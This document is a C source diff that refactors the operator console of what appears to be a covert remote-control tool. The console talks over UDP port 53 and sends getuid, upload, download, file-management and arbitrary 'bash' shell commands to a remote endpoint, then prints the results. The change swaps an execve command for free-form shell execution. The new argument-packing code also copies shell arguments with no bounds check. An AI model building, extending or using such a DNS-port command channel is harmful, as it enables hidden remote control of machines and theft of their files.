@@ -10,117 +10,11 @@
 #include <ctype.h>
 #include "zlib.h"
 
-static void * handleTraffic(void * arg)
-{
-    int pipeFd = *((int *)arg);
-    int fd = udp_bind(53);
-    if (fd == -1)
-    {
-        return 0;
-    }
-
-    char dataReq[65536];
-    char dataRsp[1024*1024];
-    while(1)
-    {
-        int datalen = 0;
-        int hasData = wait_data(pipeFd, 0);
-
-        if (hasData == 1)
-        {
-            datalen = read(pipeFd, dataReq, sizeof(dataReq));
-            if (datalen <= 0)
-            {
-                perror("read");
-                continue;
-            }
-        }
-        else if(hasData == 0)
-        {
-            ((struct CmdReq *)dataReq)->code = 0;
-            datalen = 8;
-        }
-        
-        char addr[1][16] = {0};
-        int ret = server_send(fd, dataReq, datalen, addr);
-        if(ret <= 0)
-        {
-            perror("server_send");
-        }
-
-        if (hasData)
-        {
-        recv:
-            ret = server_recv(fd, dataRsp, sizeof(dataRsp), addr);
-            if(ret > 0)
-            {
-                struct CmdReq * req = (struct CmdReq *)dataReq;
-                struct CmdRsp * rsp = (struct CmdRsp *)dataRsp;
-                if(rsp->sid != req->sid)
-                    goto recv;
-                unsigned int datalen = ntohl(rsp->datalen);
-
-                if (rsp->errNo == CUSTOM_ERRNO)
-                {
-                    rsp->data[datalen] = 0;
-                    printf("Remote error: %s.\n", rsp->data);
-                }
-                else if(rsp->errNo != 0)
-                {
-                    const char * errMsg = strerror(rsp->errNo);
-                    printf("Remote error: %s.\n", errMsg);
-                }
-                else
-                {
-                    if (rsp->flag == 1)
-                    {
-                        unsigned long plainLen = datalen*10;
-                        char * plain = (char *)malloc(plainLen + 1);
-                        int ret = uncompress((Bytef *)plain, &plainLen, (const Bytef *)rsp->data, datalen);
-                        if (ret == Z_OK)
-                        {
-                            if (req->code == SERVER_CMD_DOWNLOAD) //传输的是文件数据
-                            {
-                                const char * remoteName = (char *)(req + 1);
-                                const char * localName = remoteName + strlen(remoteName) + 1;
-                                int ret = writeFile(localName, plain, plainLen);
-                                if (ret < 0)
-                                {
-                                    perror("writeFile");
-                                }
-                                else
-                                {
-                                    printf("Download remote %s to %s success\n", remoteName, localName);
-                                }
-                            }
-                            else
-                            {
-                                plain[plainLen] = 0;
-                                printf(">>%s\n", plain);
-                            }
-                        }
-                        else
-                        {
-                            printf("uncompress %d, rsplen %d\n", ret, datalen);
-                        }
-                        free(plain);
-                    }
-                    else
-                    {
-                        rsp->data[datalen] = 0;
-                        printf(">>%s\n", rsp->data);
-                    }
-                }
-            }
-        }
-    }
-}
-
 /*
     process_getuid, //SERVER_CMD_GETUID
     process_upload, //SERVER_CMD_UPLOAD
     process_download,//SERVER_CMD_DOWNLOAD
-    process_execute,//SERVER_CMD_EXECUTE
+    process_shellcmd,//SERVER_CMD_SHELL
     process_move,//SERVER_CMD_MOVE
     process_mkdir,//SERVER_CMD_MKDIR
     process_del_dir,//SERVER_CMD_DELDIR
@@ -140,7 +34,7 @@ static struct
     {"getuid", {0, 0, 0, 0, 0}},
     {"upload", {"<remote>", "<local>", 0, 0, 0}},
     {"download", {"<remote>", "<local>", 0, 0, 0}},
-    {"execve", {"<executable", 0, 0, 0, 0}},
+    {"bash", {"<shell cmd>", 0, 0, 0, 0}},
     {"move", {"<src>", "<dst>", 0, 0, 0}},
     {"mkdir", {"<dir>", 0, 0, 0, 0}},
     {"rmdir", {"<dir>", 0, 0, 0, 0}},
@@ -216,8 +110,162 @@ static int parseCmdLine(char * cmdline, char *argv[])
     return argc;
 }
 
+static int buildCmdReq(unsigned char code, char *argv[], int argc, char * out, int maxSize)
+{
+    struct CmdReq * cmd = (struct CmdReq *)out;
+    cmd->code = code;
+    getRand(&cmd->sid, 2);
+    char * p = cmd->data;
+    int offset = 0;
+    if (code == SERVER_CMD_SHELL)
+    {
+        //将所有参数组合成一个参数
+        for (int i = 1; i < argc; i++)
+        {
+            for (int j = 0; argv[i][j]; j++)
+            {
+                p[offset++] = argv[i][j];
+            }
+            p[offset++] = ' ';
+        }
+    }
+    else
+    {
+        for (int i = 1; i < argc; i++)
+        {
+            int len = strlen(argv[i]) + 1;
+            memcpy_s(p + offset, maxSize - offset - sizeof(*cmd), argv[i], len);
+            offset += len;
+        }
+    }
+    
+    cmd->datalen = htons(offset);
+    return offset + sizeof(*cmd);
+}
+
+static void parseCmdRsp(const struct CmdReq * req, const char * data, int len)
+{
+    struct CmdRsp * rsp = (struct CmdRsp *)data;
+    unsigned int datalen = ntohl(rsp->datalen);
+    if (datalen > len)
+    {
+        printf("Recv CmdRsp length error\n");
+        return;
+    }
+    
+    if (rsp->errNo == CUSTOM_ERRNO)
+    {
+        rsp->data[datalen] = 0;
+        printf("Remote error: %s.\n", rsp->data);
+    }
+    else if(rsp->errNo != 0)
+    {
+        const char * errMsg = strerror(rsp->errNo);
+        printf("Remote error: %s.\n", errMsg);
+    }
+    else
+    {
+        if (rsp->flag == 1)
+        {
+            unsigned long plainLen = datalen*10;
+            char * plain = (char *)malloc(plainLen + 1);
+            int ret = uncompress((Bytef *)plain, &plainLen, (const Bytef *)rsp->data, datalen);
+            if (ret == Z_OK)
+            {
+                if (req->code == SERVER_CMD_DOWNLOAD) //传输的是文件数据
+                {
+                    const char * remoteName = (char *)(req + 1);
+                    const char * localName = remoteName + strlen(remoteName) + 1;
+                    int ret = writeFile(localName, plain, plainLen);
+                    if (ret < 0)
+                    {
+                        perror("writeFile");
+                    }
+                    else
+                    {
+                        printf("Download remote %s to %s success\n", remoteName, localName);
+                    }
+                }
+                else
+                {
+                    plain[plainLen] = 0;
+                    printf("\n%s\n", plain);
+                }
+            }
+            else
+            {
+                printf("uncompress %d, rsplen %d\n", ret, datalen);
+            }
+            free(plain);
+        }
+        else
+        {
+            rsp->data[datalen] = 0;
+            printf("\n%s\n", rsp->data);
+        }
+    }
+}
+
+static void * handleTraffic(void * arg)
+{
+    int pipeFd = *((int *)arg);
+    int fd = udp_bind(53);
+    if (fd == -1)
+    {
+        return 0;
+    }
+
+    char dataReq[65536];
+    char dataRsp[1024*1024];
+    while(1)
+    {
+        int datalen = 0;
+        int hasData = wait_data(pipeFd, 0);
+
+        if (hasData == 1)
+        {
+            datalen = read(pipeFd, dataReq, sizeof(dataReq));
+            if (datalen <= 0)
+            {
+                perror("read");
+                continue;
+            }
+        }
+        else if(hasData == 0)
+        {
+            ((struct CmdReq *)dataReq)->code = 0;
+            datalen = 8;
+        }
+        
+        char addr[1][16] = {0};
+        int ret = server_send(fd, dataReq, datalen, addr);
+        if(ret <= 0)
+        {
+            perror("server_send");
+        }
+
+        if (hasData)
+        {
+        recv:
+            ret = server_recv(fd, dataRsp, sizeof(dataRsp), addr);
+            if(ret > 0)
+            {
+                struct CmdReq * req = (struct CmdReq *)dataReq;
+                struct CmdRsp * rsp = (struct CmdRsp *)dataRsp;
+                if(rsp->sid != req->sid)
+                    goto recv;
+
+                parseCmdRsp(req, dataRsp, ret);
+                write(1, ">>", 2);
+            }
+        }
+    }
+}
+
 int main()
 {
+    setbuf(stdout, 0);
+
     int fds[2];
     if(pipe(fds) != 0)
     {
@@ -250,26 +298,14 @@ int main()
             continue;
         }
         
-        if (argc1 - 1 != argc2)
+        if (argc1 - 1 < argc2)
         {
             help(code);
             continue;
         }
         
-        struct CmdReq * cmd = (struct CmdReq *)buffer;
-        cmd->code = code;
-        getRand(&cmd->sid, 2);
-        char * p = cmd->data;
-        int offset = 0;
-        for (int i = 1; i < argc1; i++)
-        {
-            int len = strlen(argv[i]) + 1;
-            memcpy_s(p + offset, sizeof(buffer) - offset - sizeof(*cmd), argv[i], len);
-            offset += len;
-        }
-
-        cmd->datalen = htons(offset);        
-        int len = write(fds[1], buffer, offset + sizeof(*cmd));
+        int len = buildCmdReq(code, argv, argc1, buffer, sizeof(buffer));        
+        len = write(fds[1], buffer, len);
         if (len <=0 )
         {
             perror("write");
